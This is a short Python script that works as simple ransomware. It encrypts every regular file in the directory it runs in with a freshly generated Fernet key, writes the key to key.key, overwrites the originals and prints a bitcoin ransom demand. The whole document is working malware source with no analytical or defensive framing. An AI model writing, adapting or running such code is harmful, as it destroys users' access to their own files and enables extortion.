import os
from cryptography.fernet import Fernet

files= []

for file in os.listdir():
    if file == 'gimme_money.py' or file == 'key.key' or file == 'unlocker.py':
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
with open("key.key", "wb") as keywrite:
    keywrite.write(key)

for file in files:
    with open(file, "rb") as fileread:
        file_content = fileread.read()
    encrypted_content = Fernet(key).encrypt(file_content)
    with open(file, "wb") as filewrite:
        filewrite.write(encrypted_content)

print("FILES ENCRYPTED, PAY BITCOIN OR YOUR CUTE POTATO PC DIES!!!")